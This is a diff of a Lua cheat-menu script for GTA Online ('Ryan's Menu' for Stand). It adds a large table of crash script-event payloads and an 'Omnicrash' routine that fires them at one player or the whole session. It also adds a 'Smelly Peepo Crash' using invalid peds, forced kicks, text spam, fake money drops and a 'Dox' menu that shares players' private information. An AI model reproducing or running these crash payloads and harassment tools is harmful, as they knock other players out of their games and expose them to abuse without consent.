@@ -1,5 +1,6 @@
-VERSION = "0.5.5"
+VERSION = "0.5.6"
 RESOURCES = {"Crosshair.png"}
+STAND_DOESNT_LIKE_SPAM_CHAT = true
 
 
 -- Globals --
@@ -118,6 +119,86 @@ PTFX = {
     ["Gumball Machine"] = {"core", "ent_dst_gen_gobstop", 500}
 }
 
+CRASH_EVENTS = {
+    {-1386010354, player_id, player_id, player_id, -788905164},
+    {962740265, player_id, player_id, player_id, -788905164},
+    {-1386010354, player_id, 0, 23243, 5332, 3324, 845546543, 3437435, player_id},
+    {962740265, player_id, 23243, 5332, 3324, player_id},
+    {962740265, -72614, 63007, 59027, -12012, -26996, 33398, player_id},
+    {-1386010354, -72614, 63007, 59027, -12012, -26996, 33398, player_id},
+    {-1386010354, -72614, 63007, 59027, -12012, -26996, 33398, player_id},
+    {-1386010354, -72614, 63007, 59027, -12012, -26996, 33398, player_id},
+    {962740265, player_id, player_id, 30583, player_id, player_id, player_id, player_id, -328966, 10128444},
+    {-1386010354, pid, pid, 30583, pid, pid, pid, pid, -328966, 10128444},
+    {-1386010354, player_id, player_id, player_id, -788905164},
+    {962740265, player_id, player_id, player_id, -788905164},
+    {962740265, player_id, 95398, 98426, -24591, 47901, -64814},
+    {962740265, player_id, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647},
+    {-1386010354, player_id, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647},
+    {677240627, player_id, -1774405356},{962740265, player_id, player_id, math.random(-2147483647, 2147483647), player_id},
+    {962740265, player_id, player_id, 1001, player_id},
+    {-1386010354, player_id, player_id, math.random(-2147483647, 2147483647), player_id},
+    {-1386010354, player_id, player_id, 1001, player_id},
+    {-2113023004, player_id, math.random(115831, 9999449)},
+    {-2113023004, player_id, math.random(115831, 9999449), math.random(-1, 1)},
+    {-2113023004, player_id, math.random(115831, 9999449), math.random(-1, 1), math.random(-1, 3)},
+    {-2113023004, player_id, math.random(115831, 9999449), math.random(-1, 1), math.random(-1, 3), math.random(-1, 101)},
+    {-2113023004, player_id, math.random(115831, 9999449), math.random(-1, 1), math.random(-1, 3), math.random(-1, 101), math.random(-1, 3)},
+    {-2113023004, player_id, math.random(115831, 9999449), math.random(-1, 1), math.random(-1, 3), math.random(-1, 101), math.random(-1, 3), math.random(-1, 1)},
+    {677240627, player_id, math.random(-1996063584, 1999997397)},
+    {677240627, player_id, 22963134},
+    {677240627, player_id, math.random(-1996063584, 1999997397), math.random(-1, 385999)},
+    {677240627, player_id, math.random(-1996063584, 1999997397), math.random(-1, 385999), math.random(-1, 166000)},
+    {677240627, player_id, math.random(-1996063584, 1999997397), math.random(-1, 385999), math.random(-1, 166000), math.random(-1, 1351433445)},
+    {677240627, player_id, math.random(-1996063584, 1999997397), math.random(-1, 385999), math.random(-1, 166000), math.random(-1, 1351433445), math.random(-1, 1951345490)},
+    {677240627, player_id, math.random(-1996063584, 1999997397), math.random(-1, 385999), math.random(-1, 166000), math.random(-1, 1351433445), math.random(-1, 1951345490), math.random(-1, 116)},
+    {677240627, player_id, math.random(-1996063584, 1999997397), math.random(-1, 385999), math.random(-1, 166000), math.random(-1, 1351433445), math.random(-1, 1951345490), math.random(-1, 116), math.random(-1, 1)},
+    {677240627, player_id, math.random(-1996063584, 1999997397), math.random(-1, 385999), math.random(-1, 166000), math.random(-1, 1351433445), math.random(-1, 1951345490), math.random(-1, 116), math.random(-1, 1), math.random(-1, 1)},
+    {603406648, player_id, player_id, math.random(-2147483647, 2147483647), player_id},
+    {603406648, player_id, player_id, 1001, player_id},
+    {704979198, player_id, math.random(-1, 1)},
+    {704979198, player_id, math.random(-1, 1), math.random(-2, 0)},
+    {704979198, player_id, math.random(-1, 1), math.random(-2, 0), math.random(3, 5)},
+    {704979198, player_id, math.random(-1, 1), math.random(-2, 0), math.random(3, 5), math.random(172, 174)},
+    {704979198, player_id, math.random(-1, 1), math.random(-2, 0), math.random(3, 5), math.random(172, 174), math.random(20, 510)},
+    {704979198, player_id, math.random(-1, 1), math.random(-2, 0), math.random(3, 5), math.random(172, 174), math.random(20, 510), math.random(62, 64)},
+    {704979198, player_id, math.random(-1, 1), math.random(-2, 0), math.random(3, 5), math.random(172, 174), math.random(20, 510), math.random(62, 64), math.random(-1, 1), math.random(-1, 1), math.random(-1, 1), math.random(-1, 1)},
+    {704979198, player_id, math.random(-1, 1), math.random(-2, 0), math.random(3, 5), math.random(172, 174), math.random(20, 510), math.random(62, 64), math.random(-1, 1), math.random(-1, 1), math.random(-1, 1), math.random(-1, 1), math.random(-1, 1)},
+    {704979198, player_id, math.random(-1, 1), math.random(-2, 0), math.random(3, 5), math.random(172, 174), math.random(20, 510), math.random(62, 64), math.random(-1, 1), math.random(-1, 1), math.random(-1, 1), math.random(-1, 1), math.random(-1, 1), math.random(-1, 1)},
+    {-1715193475, player_id, player_id, player_id, math.random(-2147483647, 2147483647), player_id},
+    {1258808115, player_id, player_id, player_id, math.random(-2147483647, 2147483647), player_id},
+    {2112408256, player_id, math.random(-1986324736, 1747413822)},
+    {2112408256, player_id, 77777776},
+    {2112408256, player_id, math.random(-1986324736, 1747413822), math.random(-1986324736, 1777712108)},
+    {2112408256, player_id, 77777776, 77777776},
+    {2112408256, player_id, math.random(-1986324736, 1747413822), math.random(-1986324736, 1777712108), math.random(-1673857408, 1780088064)},
+    {2112408256, player_id, 77777776, 77777776, 77777776},
+    {2112408256, player_id, math.random(-1986324736, 1747413822), math.random(-1986324736, 1777712108), math.random(-1673857408, 1780088064), math.random(-2588888790, 2100146067)},
+    {998716537, player_id, player_id, math.random(-2147483647, 2147483647), player_id},
+    {998716537, player_id, player_id, 1001, player_id},
+    {163598572, player_id, player_id, math.random(-2147483647, 2147483647), player_id},
+    {163598572, player_id, player_id, 1001, player_id},
+    {-1970125962, player_id, math.random(-1, 50)},
+    {-1970125962, player_id, math.random(-1, 50), math.random(-1, 50)},
+    {-1056683619, player_id, player_id, math.random(-2147483647, 2147483647), player_id},
+    {-1056683619, player_id, player_id, 1001, player_id},
+    {436475575, player_id, 20},
+    {1757755807, player_id, 62, 2},
+    {-1767058336, player_id, 3},
+    {-1013679841, player_id, player_id, 111},
+    {-1501164935, player_id, 0},
+    {998716537, player_id, 0},
+    {163598572, player_id, 0},
+    {924535804, player_id, 0},
+    {69874647, player_id, 0},
+    {-1782442696, player_id, 420, 69},
+    {1445703181, player_id, 28, 4294967295, 4294967295},
+    {-1386010354, player_id, 4294894682, -4294904289, -4294908269, 4294955284, 4294940300, -4294933898},
+    {962740265, player_id, 4294894682, -4294904289, -4294908269, 4294955284, 4294940300, -4294933898},
+    {-1501164935, player_id, player_id, math.random(-2147483647, 2147483647), player_id},
+    {-1501164935, player_id, player_id, 1001, player_id}
+}
+
 PTFX_BODY_HEAD_BONES = {"IK_Head"}
 PTFX_BODY_HANDS_BONES = {"IK_L_Hand", "IK_R_Hand"}
 PTFX_BODY_LEFT_HAND_BONES = {"IK_L_Hand"}
@@ -223,7 +304,7 @@ function format_int(number)
 end
 
 function takeover_vehicle(action, player_id, wait_for)
-    local player_name = players.get_name(player_id)
+    local player_name = PLAYER.GET_PLAYER_NAME(player_id)
     menu.trigger_commands("tpveh" .. player_name)
     util.yield(750)
 
@@ -249,7 +330,7 @@ function takeover_vehicle_all(action, modders, wait_for)
             end
         end
     end
-    teleport_to(starting_coords['x'], starting_coords['y'], starting_coords['z'])
+    teleport_to(starting_coords.x, starting_coords.y, starting_coords.z)
     menu.trigger_commands("otr off")
     menu.trigger_commands("invisibility off")
 end
@@ -312,8 +393,8 @@ function get_closest_vehicle(coords) -- Credit: LanceScript
         if vehicle ~= PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false) then
             local vehicle_coords = ENTITY.GET_ENTITY_COORDS(vehicle)
             local distance = MISC.GET_DISTANCE_BETWEEN_COORDS(
-                coords['x'], coords['y'], coords['z'],
-                vehicle_coords['x'], vehicle_coords['y'], vehicle_coords['z'], true
+                coords.x, coords.y, coords.z,
+                vehicle_coords.x, vehicle_coords.y, vehicle_coords.z, true
             )
             if distance < closest_distance then
                 closest_distance = distance
@@ -474,10 +555,10 @@ function get_players_by_money()
     
     message = ""
     if data[1] ~= -1 then
-        message = players.get_name(data[1]) .. " is the richest player here ($" .. format_int(data[2]) .. ")."
+        message = PLAYER.GET_PLAYER_NAME(data[1]) .. " is the richest player here ($" .. format_int(data[2]) .. ")."
     end
     if data[1] ~= data[3] then
-        message = message .. " " .. players.get_name(data[3]) .. " is the poorest ($" .. format_int(data[4]) .. ")."
+        message = message .. " " .. PLAYER.GET_PLAYER_NAME(data[3]) .. " is the poorest ($" .. format_int(data[4]) .. ")."
     end
     if message ~= "" then
         chat.send_message(message, false, true, true)
@@ -490,10 +571,10 @@ function get_players_by_kd()
     
     message = ""
     if data[1] ~= -1 then
-        message = players.get_name(data[1]) .. " has the highest K/D here (" .. string.format("%.1f", data[2]) .. ")."
+        message = PLAYER.GET_PLAYER_NAME(data[1]) .. " has the highest K/D here (" .. string.format("%.1f", data[2]) .. ")."
     end
     if data[1] ~= data[3] then
-        message = message .. " " .. players.get_name(data[3]) .. " has the lowest (" .. string.format("%.1f", data[4]) .. ")."
+        message = message .. " " .. PLAYER.GET_PLAYER_NAME(data[3]) .. " has the lowest (" .. string.format("%.1f", data[4]) .. ")."
     end
     if message ~= "" then
         chat.send_message(message, false, true, true)
@@ -564,7 +645,7 @@ function set_mc_clutter(command, click_type, amount)
 end
 
 function sms_spam(player_id, message, duration)
-    local player_name = players.get_name(player_id)
+    local player_name = PLAYER.GET_PLAYER_NAME(player_id)
     menu.trigger_commands("smsrandomsender" .. player_name .. " on")
     menu.trigger_commands("smstext" .. player_name .. " " .. message)
     menu.trigger_commands("smsspam" .. player_name .. " on")
@@ -628,7 +709,7 @@ function do_ptfx_at_entity_bone_coords(entity, bones, asset, name)
         local bone_index = ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(entity, bone)
         local coords = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(entity, bone_index)
         if coords_magnitude(coords) > 0.0 then
-            do_ptfx_at_coords(coords['x'], coords['y'], coords['z'], asset, name)
+            do_ptfx_at_coords(coords.x, coords.y, coords.z, asset, name)
         end
     end
 end
@@ -643,12 +724,16 @@ end
 
 
 -- Vector Arithmetic --
+function coords_add(coords_a, coords_b)
+    return {x = coords_a.x + coords_b.x, y = coords_a.y + coords_b.y, z = coords_a.z + coords_b.z}
+end
+
 function coords_substract(coords_a, coords_b)
-    return {x = coords_a['x'] - coords_b['x'], y = coords_a['y'] - coords_b['y'], z = coords_a['z'] - coords_b['z']}
+    return {x = coords_a.x - coords_b.x, y = coords_a.y - coords_b.y, z = coords_a.z - coords_b.z}
 end
 
 function coords_multiply(coords, amount)
-    return {x = coords['x'] * amount, y = coords['y'] * amount, z = coords['z'] * amount}
+    return {x = coords.x * amount, y = coords.y * amount, z = coords.z * amount}
 end
 
 function coords_distance(coords_a, coords_b)
@@ -656,7 +741,7 @@ function coords_distance(coords_a, coords_b)
 end
 
 function coords_magnitude(coords)
-    return math.sqrt(coords['x'] ^ 2 + coords['y'] ^ 2 + coords['z'] ^ 2)
+    return math.sqrt(coords.x ^ 2 + coords.y ^ 2 + coords.z ^ 2)
 end
 
 function coords_normalize(coords)
@@ -700,6 +785,16 @@ function face_entity(ent1, ent2) -- Credit: WiriScript
 	local dy = b.y - a.y
 	local heading = MISC.GET_HEADING_FROM_VECTOR_2D(dx, dy)
 	return ENTITY.SET_ENTITY_HEADING(ent1, heading)
+end
+
+function do_fake_money_drop(player_id)
+    menu.trigger_commands("notifybanked" .. PLAYER.GET_PLAYER_NAME(player_id) .. " " .. math.random(100, 5000))
+    local coords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
+    local bag = entities.create_object(2628187989, coords_add(coords, {x = 0, y = 0, z = 2}))
+    ENTITY.APPLY_FORCE_TO_ENTITY(bag, 3, 0, 0, -15, 0.0, 0.0, 0.0, true, true)
+    util.yield(250)
+    AUDIO.PLAY_SOUND_FROM_COORD(-1, "LOCAL_PLYR_CASH_COUNTER_COMPLETE", coords.x, coords.y, coords.z, "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS", true, 2, false)
+    entities.delete_by_handle(bag)
 end
 
 
@@ -757,7 +852,7 @@ function run_all(commands, modders, wait_for)
     for _, player_id in pairs(players.list()) do
         if player_id ~= players.user() and not players.is_in_interior(player_id) then
             if modders or not players.is_marked_as_modder(player_id) then
-                local player_name = players.get_name(player_id)
+                local player_name = PLAYER.GET_PLAYER_NAME(player_id)
                 menu.trigger_commands("tp" .. player_name)
                 util.yield(1250)
                 if player_name ~= "**invalid**" then
@@ -769,14 +864,14 @@ function run_all(commands, modders, wait_for)
             end
         end
     end
-    teleport_to(starting_coords['x'], starting_coords['y'], starting_coords['z'])
+    teleport_to(starting_coords.x, starting_coords.y, starting_coords.z)
     menu.trigger_commands("otr off")
     menu.trigger_commands("invisibility off")
     menu.trigger_commands("levitation off")
 end
 
-function trash_pickup(player_id)
-    util.toast("Sending the trash man to " .. players.get_name(player_id) .. "...")
+function do_trash_pickup(player_id)
+    util.toast("Sending the trash man to " .. PLAYER.GET_PLAYER_NAME(player_id) .. "...")
 
     local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
     local player_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
@@ -843,6 +938,19 @@ function send_translated(message, language, latin)
         util.toast("Failed to translate message.")
     end)
     async_http.dispatch()
+end
+
+function do_omnicrash(player_id)
+    show_text_message(COLOR_PURPLE, "Omnicrash Mk II", "Omnicrash has begun. This may take a while...")
+    for _, crash_event in pairs(CRASH_EVENTS) do
+        send_script_event("script event crash", crash_event, player_id)
+    end
+end
+
+function send_script_event(name, args, player_id)
+    util.toast("Attempting " .. name .. "...")
+    util.trigger_script_event(1 << player_id, args)
+    util.yield(75)
 end
 
 
@@ -976,21 +1084,21 @@ util.create_tick_handler(function()
             local player_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
             
             if side == 1 then
-                player_coords['x'] = player_coords['x'] + forcefield_size * 0.66
-                player_coords['y'] = player_coords['y'] + forcefield_size * 0.66
+                player_coords.x = player_coords.x + forcefield_size * 0.66
+                player_coords.y = player_coords.y + forcefield_size * 0.66
             elseif side == 2 then
-                player_coords['x'] = player_coords['x'] + forcefield_size * 0.66
-                player_coords['y'] = player_coords['y'] - forcefield_size * 0.66
+                player_coords.x = player_coords.x + forcefield_size * 0.66
+                player_coords.y = player_coords.y - forcefield_size * 0.66
             elseif side == 3 then
-                player_coords['x'] = player_coords['x'] - forcefield_size * 0.66
-                player_coords['y'] = player_coords['y'] - forcefield_size * 0.66
+                player_coords.x = player_coords.x - forcefield_size * 0.66
+                player_coords.y = player_coords.y - forcefield_size * 0.66
             elseif side == 4 then
-                player_coords['x'] = player_coords['x'] - forcefield_size * 0.66
-                player_coords['y'] = player_coords['y'] + forcefield_size * 0.66
+                player_coords.x = player_coords.x - forcefield_size * 0.66
+                player_coords.y = player_coords.y + forcefield_size * 0.66
             end
 
             FIRE.ADD_EXPLOSION(
-                player_coords['x'], player_coords['y'], player_coords['z'],
+                player_coords.x, player_coords.y, player_coords.z,
                 29, 5.0, false, true, 0.0
             )
         end
@@ -1069,7 +1177,7 @@ create_ptfx_list(self_ptfx_weapon_aiming_root, function(ptfx)
         local raycast = do_raycast(1000.0)
         if raycast.did_hit then
             local coords = raycast.hit_coords
-            do_ptfx_at_coords(coords['x'], coords['y'], coords['z'], ptfx[1], ptfx[2])
+            do_ptfx_at_coords(coords.x, coords.y, coords.z, ptfx[1], ptfx[2])
             util.yield(ptfx[3])
         end
     end
@@ -1099,7 +1207,7 @@ create_ptfx_list(self_ptfx_weapon_impact_root, function(ptfx)
     local impact_ptr = memory.alloc()
     if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(player_ped, impact_ptr) then
         local coords = memory.read_vector3(impact_ptr)
-        do_ptfx_at_coords(coords['x'], coords['y'], coords['z'], ptfx[1], ptfx[2])
+        do_ptfx_at_coords(coords.x, coords.y, coords.z, ptfx[1], ptfx[2])
         memory.free(impact_ptr)
     end
 end)
@@ -1121,7 +1229,7 @@ create_ptfx_list(self_ptfx_pointing_crosshair_root, function(ptfx)
         local raycast = do_raycast(1000.0)
         if raycast.did_hit then
             local coords = raycast.hit_coords
-            do_ptfx_at_coords(coords['x'], coords['y'], coords['z'], ptfx[1], ptfx[2])
+            do_ptfx_at_coords(coords.x, coords.y, coords.z, ptfx[1], ptfx[2])
             util.yield(ptfx[3])
         end
     end
@@ -1148,64 +1256,54 @@ end)
 
 -- -- Crosshair When Pointing
 world_crosshair_when_pointing = false
+player_is_pointing = false
+
 menu.toggle(world_root, "Crosshair When Pointing", {"ryanpointingcrosshair"}, "Adds a crosshair when pointing.", function(value)
     world_crosshair_when_pointing = value
 end)
 
-player_is_pointing = false
-util.create_tick_handler(function()
-    player_is_pointing = memory.read_int(memory.script_global(4516656 + 930)) == 3
-    if world_crosshair_when_pointing and player_is_pointing then
-        directx.draw_texture(
-            POINTING_CROSSHAIR,
-            0.03, 0.03,
-            0.5, 0.5,
-            0.5, 0.5,
-            0.0,
-            {["r"] = 1.0, ["g"] = 1.0, ["b"] = 1.0, ["a"] = 1.0}
-        )
-    end
-    util.yield()
-end)
-
 
 -- Session Menu --
-session_spam_chat_root = menu.list(session_root, "Spam Chat...", {"ryanspam"}, "Spams the chat with a message from all players.")
+if not STAND_DOESNT_LIKE_SPAM_CHAT then
+    session_spam_chat_root = menu.list(session_root, "Spam Chat...", {"ryanspam"}, "Spams the chat with a message from all players.")
+end
 session_trolling_root = menu.list(session_root, "Trolling...", {"ryantrolling"}, "Trolling options on all players.")
 session_nuke_attack_root = menu.list(session_root, "Nuke...", {"ryannuke"}, "Plays a siren, timer, and bomb with additional earrape.")
 session_dox_root = menu.list(session_root, "Dox...", {"ryandox"}, "Shares information players probably want private.")
 
 -- -- Spam Chat
-spam_chat_all_players = true
-spam_chat_delay = 100
-spam_chat_message = "Get Ryan's Menu for Stand!"
-spam_chat_last = 0
+if not STAND_DOESNT_LIKE_SPAM_CHAT then
+    spam_chat_all_players = true
+    spam_chat_delay = 100
+    spam_chat_message = "Get Ryan's Menu for Stand!"
+    spam_chat_last = 0
 
-menu.toggle_loop(session_spam_chat_root, "Spam: Loop", {"ryanspamloop"}, "If enabled, the message will be spammed continuously.", function()
-    if util.current_time_millis() - spam_chat_last >= spam_chat_delay * 32 then
+    menu.toggle_loop(session_spam_chat_root, "Spam: Loop", {"ryanspamloop"}, "If enabled, the message will be spammed continuously.", function()
+        if util.current_time_millis() - spam_chat_last >= spam_chat_delay * 32 then
+            spam_chat(spam_chat_message, spam_chat_all_players, spam_chat_delay, 0)
+            spam_chat_last = util.current_time_millis()
+        end
+    end, false)
+    menu.action(session_spam_chat_root, "Spam: Once", {"ryanspamonce"}, "Spams the message once.", function()
+        local spam_chat_type = "other players' names"
+        if spam_chat_all_players then
+            spam_chat_type = "your real name"
+        end
+        util.toast("Spamming chat using " .. spam_chat_type .. ".")
         spam_chat(spam_chat_message, spam_chat_all_players, spam_chat_delay, 0)
-        spam_chat_last = util.current_time_millis()
-    end
-end, false)
-menu.action(session_spam_chat_root, "Spam: Once", {"ryanspamonce"}, "Spams the message once.", function()
-    local spam_chat_type = "other players' names"
-    if spam_chat_all_players then
-        spam_chat_type = "your real name"
-    end
-    util.toast("Spamming chat using " .. spam_chat_type .. ".")
-    spam_chat(spam_chat_message, spam_chat_all_players, spam_chat_delay, 0)
-end)
+    end)
 
-menu.divider(session_spam_chat_root, "Options")
-menu.toggle(session_spam_chat_root, "All Players Spam", {"ryanspamall"}, "If enabled, all players spam. Otherwise your real name is used.", function(value)
-    spam_chat_all_players = value
-end, true)
-menu.slider(session_spam_chat_root, "Delay Between Messages", {"ryanspamdelay"}, "Delay in milliseconds between each message.", 0, 1000, 25, 25, function(value)
-    spam_chat_delay = value
-end)
-menu.text_input(session_spam_chat_root, "Message", {"ryanspammessage"}, "The message that will be spammed.", function(value)
-    spam_chat_message = value
-end, "Get Ryan's Menu for Stand!")
+    menu.divider(session_spam_chat_root, "Options")
+    menu.toggle(session_spam_chat_root, "All Players Spam", {"ryanspamall"}, "If enabled, all players spam. Otherwise your real name is used.", function(value)
+        spam_chat_all_players = value
+    end, true)
+    menu.slider(session_spam_chat_root, "Delay Between Messages", {"ryanspamdelay"}, "Delay in milliseconds between each message.", 0, 1000, 25, 25, function(value)
+        spam_chat_delay = value
+    end)
+    menu.text_input(session_spam_chat_root, "Message", {"ryanspammessage"}, "The message that will be spammed.", function(value)
+        spam_chat_message = value
+    end, "Get Ryan's Menu for Stand!")
+end
 
 -- -- Vehicle
 trolling_watch_time = 5000
@@ -1286,7 +1384,13 @@ menu.action(session_nuke_attack_root, "Start Nuke", {"ryannukestart"}, "Starts t
     explode_all(EARRAPE_BED, 0)
     explode_all(EARRAPE_NONE, 0)
     if nuke_spam_enabled then
-        spam_chat(spam_chat_message, true, spam_chat_delay, 0)
+        if not STAND_DOESNT_LIKE_SPAM_CHAT then
+            spam_chat(spam_chat_message, true, spam_chat_delay, 0)
+        else
+            menu.trigger_commands("spam on")
+            util.yield(3000)
+            menu.trigger_commands("spam off")
+        end
     end
 end)
 
@@ -1306,6 +1410,39 @@ end)
 menu.action(session_dox_root, "Oppressor", {"ryanoppressor"}, "Shares the name of the players in Oppressors.", function()
     get_players_by_oppressor2()
 end)
+
+-- -- Omnicrash
+session_omnicrash_root = menu.list(session_root, "Omnicrash", {"ryanomnicrashall"}, "The ultimate session crash.")
+session_omnicrash_friends = false
+session_omnicrash_modders = true
+
+menu.action(session_omnicrash_root, "Go", {"ryanomnicrashallgo"}, "Attempts to crash using all known script events.", function()
+    for _, player_id in pairs(players.list(false, session_omnicrash_friends)) do
+        if session_omnicrash_modders or not players.is_marked_as_modder(player_id) then
+            util.create_thread(function()
+                do_omnicrash(player_id)
+            end)
+        end
+    end
+end)
+
+menu.divider(session_omnicrash_root, "Options")
+menu.toggle(session_omnicrash_root, "Include Friends", {"ryanomnicrashfriends"}, "If enabled, friends are included in the Omnicrash.", function(value)
+    session_omnicrash_friends = value
+end)
+menu.toggle(session_omnicrash_root, "Include Modders", {"ryanomnicrashmodders"}, "If enabled, modders are included in the Omnicrash.", function(value)
+    session_omnicrash_modders = value
+end)
+
+-- -- Fake Money Drops
+menu.toggle_loop(session_root, "Fake Money Drop", {"ryanfakemoneyall"}, "Drops fake money bags on all players.", function()
+    for _, player_id in pairs(players.list()) do
+        util.create_thread(function()
+            do_fake_money_drop(player_id)
+        end)
+    end
+    util.yield(125)
+end, false)
 
 -- -- Mk II Chaos
 menu.action(session_root, "Mk II Chaos", {"ryanmk2chaos"}, "Gives everyone a Mk 2 and requests them to duel.", function()
@@ -1360,9 +1497,43 @@ function setup_player(player_id)
     local player_root = menu.player_root(player_id)
     menu.divider(player_root, "Ryan's Menu")
     local player_trolling_root = menu.list(player_root, "Trolling...", {"ryantrolling"}, "Options that players may not like.")
+    local player_removal_root = menu.list(player_root, "Removal...", {"ryanremoval"}, "Options to remove the player forcibly.")
+    
+    -- -- No Godmode
+    local remove_godmode_notice = 0
+    menu.toggle_loop(player_trolling_root, "No Godmode", {"ryannogodmode"}, "Removes godmode from Kiddions users and their vehicles.", function()
+        remove_godmode(player_id, true)
+        if util.current_time_millis() - remove_godmode_notice >= 10000 then
+            util.toast("Still removing godmode from " .. PLAYER.GET_PLAYER_NAME(player_id) .. ".")
+            remove_godmode_notice = util.current_time_millis()
+        end
+    end, false)
 
+    -- -- Fake Money Drop
+    menu.toggle_loop(player_trolling_root, "Fake Money Drop", {"ryanfakemoney"}, "Drops fake money bags on the player.", function()
+        util.create_thread(function()
+            do_fake_money_drop(player_id)
+        end)
+        util.yield(125)
+    end, false)
+
+    -- -- Downgrade Vehicle
+    menu.action(player_trolling_root, "Downgrade Vehicle", {"ryandowngrade"}, "Downgrades the car they are in.", function()
+        takeover_vehicle(function(vehicle)
+            mod_vehicle(vehicle, false)
+        end, player_id, 0)
+        util.toast("Downgraded " .. PLAYER.GET_PLAYER_NAME(player_id) .. "'s car!")
+    end)
+
+    -- -- Trash Pickup
+    menu.action(player_trolling_root, "Send Trash Pickup", {"ryantrashpickup"}, "Send the trash man to 'clean up' the street. Yasha's idea.", function()
+        do_trash_pickup(player_id)
+    end)
+
+
+    -- Removal --
     -- -- Text & Kick
-    local text_kick_root = menu.list(player_trolling_root, "Text & Kick...", {"ryantextkick"}, "Kicks the player after spamming them with texts.")
+    local text_kick_root = menu.list(player_removal_root, "Text & Kick...", {"ryantextkick"}, "Kicks the player after spamming them with texts.")
     local text_kick_duration = 6000
     local text_kick_block_joins = false
     local text_kick_message = "See you later, child baiter."
@@ -1376,7 +1547,7 @@ function setup_player(player_id)
         text_kick_block_joins = value
     end)
     menu.action(text_kick_root, "Go", {"ryantextkickgo"}, "Start the text & kick.", function()
-        local player_name = players.get_name(player_id)
+        local player_name = PLAYER.GET_PLAYER_NAME(player_id)
         
         util.toast("Spamming " .. player_name .. " with texts...")
         sms_spam(player_id, text_kick_message, text_kick_duration)
@@ -1390,33 +1561,58 @@ function setup_player(player_id)
         menu.trigger_commands("breakup" .. player_name)
         menu.trigger_commands("players")
     end)
-    
-    -- -- No Godmode
-    local remove_godmode_notice = 0
-    menu.toggle_loop(player_trolling_root, "No Godmode", {"ryannogodmode"}, "Removes godmode from Kiddions users and their vehicles.", function()
-        remove_godmode(player_id, true)
-        if util.current_time_millis() - remove_godmode_notice >= 10000 then
-            util.toast("Still removing godmode from " .. players.get_name(player_id) .. ".")
-            remove_godmode_notice = util.current_time_millis()
+
+    -- -- Omnicrash
+    menu.action(player_removal_root, "Omnicrash Mk II", {"ryanomnicrash"}, "Attempts to crash using all known script events.", function()
+        do_omnicrash(player_id)
+    end)
+
+    -- -- Smelly Peepo Crash
+    menu.action(player_removal_root, "Smelly Peepo Crash", {"ryansmellypeepo"}, "Attempts to crash using invalid and bugged peds.", function()
+        show_text_message(COLOR_PURPLE, "Smelly Peepo Crash", "Smelly Peepo Crash has begun. This may take a while...")
+        
+        local player_coords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
+        local player_ped_heading = ENTITY.GET_ENTITY_HEADING(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
+        util.toast("Spawning smelly peds on " .. PLAYER.GET_PLAYER_NAME(player_id) .. "...")
+        local ped = entities.create_ped(0, 1057201338, player_coords, 0)
+        util.yield(100)
+        entities.delete_by_handle(ped)
+        local ped = entities.create_ped(0, -2056455422, player_coords, 0)
+        util.yield(100)
+        entities.delete_by_handle(ped)
+        local ped = entities.create_ped(0, 762327283, player_coords, 0)
+        util.yield(100)
+        entities.delete_by_handle(ped)
+
+        util.toast("Spawning the smelliest of peds on " .. PLAYER.GET_PLAYER_NAME(player_id) .. "!")
+        local fatcult = util.joaat("a_f_m_fatcult_01"); request_model(fatcult)
+        for i = 1, 12 do
+            util.create_thread(function()
+                local ped = entities.create_ped(
+                    0, fatcult,
+                    coords_add(player_coords, {x = math.random(-1, 1), y = math.random(-1, 1), z = 0}),
+                    player_ped_heading
+                )
+                util.yield(400)
+                entities.delete_by_handle(ped)
+            end)
+            util.yield(100)
+            local ped_1 = entities.create_ped(0, util.joaat("slod_human"), player_coords, player_ped_heading)
+            local ped_2 = entities.create_ped(0, util.joaat("slod_large_quadped"), player_coords, player_ped_heading)
+            local ped_3 = entities.create_ped(0, util.joaat("slod_small_quadped"), player_coords, player_ped_heading)
+            util.yield(800)
+            entities.delete_by_handle(ped_1)
+            entities.delete_by_handle(ped_2)
+            entities.delete_by_handle(ped_3)
+            send_script_event("final payload", {962740265, player_id, 23243, 5332, 3324, player_id}, player_id)
         end
-    end, false)
-
-    -- -- Downgrade Vehicle
-    menu.action(player_trolling_root, "Downgrade Vehicle", {"ryandowngrade"}, "Downgrades the car they are in.", function()
-        takeover_vehicle(function(vehicle)
-            mod_vehicle(vehicle, false)
-        end, player_id, 0)
-        util.toast("Downgraded " .. players.get_name(player_id) .. "'s car!")
+        util.toast("Done!")
     end)
 
-    -- -- Trash Pickup
-    menu.action(player_trolling_root, "Send Trash Pickup", {"ryantrashpickup"}, "Send the trash man to 'clean up' the street. Yasha's idea.", function()
-        trash_pickup(player_id)
-    end)
 
-    -- -- Divorce Kick
+    -- Divorce Kick --
     menu.action(player_root, "Divorce", {"ryandivorce"}, "Kicks the player, then blocks future joins by them.", function()
-        local player = players.get_name(player_id)
+        local player = PLAYER.GET_PLAYER_NAME(player_id)
         block_joins(player)
         menu.trigger_commands("kick" .. player)
         util.yield()
@@ -1471,3 +1667,19 @@ players.on_join(function(player_id) setup_player(player_id) end)
 players.dispatch_on_join()
 
 util.keep_running()
+
+-- Non-Threaded, Tick-Sensitive Loops --
+while true do
+    player_is_pointing = memory.read_int(memory.script_global(4516656 + 930)) == 3
+    if world_crosshair_when_pointing and player_is_pointing then
+        directx.draw_texture(
+            POINTING_CROSSHAIR,
+            0.03, 0.03,
+            0.5, 0.5,
+            0.5, 0.5,
+            0.0,
+            {["r"] = 1.0, ["g"] = 1.0, ["b"] = 1.0, ["a"] = 1.0}
+        )
+    end
+    util.yield()
+end
